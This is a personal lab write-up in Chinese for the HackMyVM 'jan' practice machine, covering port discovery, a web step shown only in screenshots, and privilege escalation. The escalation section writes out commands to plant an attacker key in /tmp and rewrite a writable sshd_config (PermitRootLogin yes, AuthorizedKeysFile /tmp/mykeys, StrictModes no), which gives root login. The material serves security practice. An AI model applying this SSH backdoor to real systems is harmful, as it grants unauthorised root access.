---
{"dg-publish":true,"dg-path":"安全/靶机/hackmyvm_jan.md","permalink":"/安全/靶机/hackmyvm_jan/","title":"hackmyvm_jan"}
---

# 主机发现
![Pasted image 20250131110451.png](/img/user/picture/Pasted%20image%2020250131110451.png)
只开了两个端口，22，8080




# web渗透

![Pasted image 20250131112116.png](/img/user/picture/Pasted%20image%2020250131112116.png)
首先提示我们了两个网页

![Pasted image 20250131112141.png](/img/user/picture/Pasted%20image%2020250131112141.png)
![Pasted image 20250131112149.png](/img/user/picture/Pasted%20image%2020250131112149.png)


本来以为是SSRF，弄了半天也没弄出来

下面是看大佬提示发现的：
![Pasted image 20250131123623.png](/img/user/picture/Pasted%20image%2020250131123623.png)

![Pasted image 20250131124950.png](/img/user/picture/Pasted%20image%2020250131124950.png)




# 提权

![Pasted image 20250131131239.png](/img/user/picture/Pasted%20image%2020250131131239.png)
发现有`/sbin/service sshd restart`权限，也就是重启ssh
很明显的提示，应该是在ssh服务上做文章

![Pasted image 20250131133242.png](/img/user/picture/Pasted%20image%2020250131133242.png)
查看ssh配置文件权限
![Pasted image 20250131131355.png](/img/user/picture/Pasted%20image%2020250131131355.png)
发现具有可写权限，更印证了思路

因为我们没有root的密码，我们可以尝试修改配置文件可以支持让我们用公钥连接root

生成一对密钥：
```shell
ssh-keygen -t ed25519 -f ~/.ssh/evil_key
```

**在目标机上创建并填充文件**（例如 `/tmp/mykeys`），将你的公钥写进去。
```shell
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...YourKey... user@attackhost" > /tmp/mykeys
chmod 600 /tmp/mykeys
```
现在 `/tmp/mykeys` 这个文件就包含了你的公钥。


修改配置文件：
```txt
# 注意：如果默认 PermitRootLogin 是 no，需要改成 yes 或 prohibit-password (允许公钥登录)。
PermitRootLogin yes

# 确保服务器允许公钥认证
PubkeyAuthentication yes

# 指向你刚才创建的文件
AuthorizedKeysFile /tmp/mykeys

StrictModes no
```

注意，我们是把公钥放在了`/tmp`中，这与 SSH 的严格模式冲突，会导致导致 sshd 不信任其中的公钥。
 即使 `sshd_config` 文件里 `#StrictModes yes` 是注释掉的，OpenSSH 默认仍会把它视为 `yes`。
 只有显式设置 `StrictModes no`，才会允许加载不安全路径下的 authorized_keys 文件


重启服务
```shell
sudo /sbin/service sshd restart
```

现在就可以直接登录上去了
![Pasted image 20250131131945.png](/img/user/picture/Pasted%20image%2020250131131945.png)







